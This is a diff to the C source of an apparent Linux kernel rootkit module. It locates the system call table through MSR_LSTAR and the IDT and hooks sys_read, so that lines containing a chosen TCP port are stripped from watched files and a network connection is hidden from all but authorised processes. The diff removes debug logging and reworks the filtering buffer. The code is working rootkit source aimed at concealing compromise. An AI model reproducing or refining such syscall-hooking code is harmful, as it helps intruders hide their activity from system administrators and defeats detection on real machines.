@@ -80,12 +80,8 @@ unsigned long *find_sys_call_table(void)
 	unsigned char code[512];
 	char **p;
 
-	printk("[%s] x86_64 sycall", __this_module.name);
-
 	rdmsrl(MSR_LSTAR, sct_off);
 	memcpy(code, (void *)sct_off, sizeof(code));
-
-	printk("[%s] MSR_LSTAR : %s", __this_module.name, code);
 
 	p = (char **)memmem(code, sizeof(code), "\xff\x14\xc5", 3);
 
@@ -115,8 +111,6 @@ unsigned long *find_sys_call_table(void) {
 	char **p;
 	unsigned long sct_off = 0;
 	unsigned char code[255];
-
-	printk("[%s] x86 sycall", __this_module.name);
 
 	asm("sidt %0":"=m" (idtr));
 	memcpy(&idt, (void *)(idtr.base + 8 * 0x80), sizeof(idt));
@@ -255,44 +249,47 @@ asmlinkage int fake_sys_open(const char *pathname, int flags)
 
 asmlinkage ssize_t fake_sys_read(int fd, void *buf, size_t count)
 {
-	int 	i	= 0;
-	ssize_t ret = 0;
-	char ** tmp_str = NULL;
-	char * tok = NULL;
-	char * tmp = NULL;
-	char * final = NULL;
-	char tampon[512];
+	int 	i			= 0;
+	ssize_t ret 		= 0;
+	char * 	p 			= (char *)buf;
+	char * 	tok			= NULL;
+	char * 	tmp			= kmalloc(count, GFP_KERNEL);
+	size_t	offset		= 0;
+	pid_t 	pid  		= original_sys_getpid();
+	pid_t 	ppid 		= original_sys_getppid();
+
+	memset(tmp, '0', count);
 
 	for(i = 0; i < vip_filenames_size; i++)
 		if(vip_filenames[i].fd == fd)
 			break;
 
 	ret = original_sys_read(fd, buf, count);
+
 	// Not a vip file, read in normally
-	if(i == vip_filenames_size)
+	if(i == vip_filenames_size || is_proc_authorized(pid) || is_proc_authorized(ppid))
 		return ret;
 
-	tmp = (char*)vmalloc(count);
-	final = (char*)vmalloc(count);
-	memcpy(tmp, buf, count);
-	tmp_str = &tmp;
-
-	//lets just print buf for now
-	while((tok = strsep(tmp_str, "\n")) != NULL)
+	//lets just print tmp for now
+	while((tok = strsep(&p, "\n")) != NULL)
 	{
 		if(strlen(tok) == 0)
 			continue;
 		else if(strstr(tok, TCP_PORT_HEX))
 			continue;
-		snprintf(tampon, 512, "%s\n", tok);
-		strcat(final, tampon);
-		printk("[%s][%s] extracting line %s\n", __this_module.name, vip_filenames[i].name, tok);
+
+		memcpy(tmp + offset, tok, strlen(tok));
+		offset += strlen(tok);
+		memcpy(tmp + offset, "\n", 1);
+		offset++;
 	}
 
-	strcat(final, "\0");
-	memcpy(buf, final, count);
-	vfree(final);
-	vfree(tmp);
+	// Zero padding at the end of the buffer
+	memset(tmp + offset, '\0', count - offset);
+	printk("[%s][%s] final line %s\n", __this_module.name, vip_filenames[i].name, tmp);
+	memcpy(buf, tmp, count);
+	kfree(tmp);
+
 	vip_filenames[i].fd = -1;
 
 	return ret;
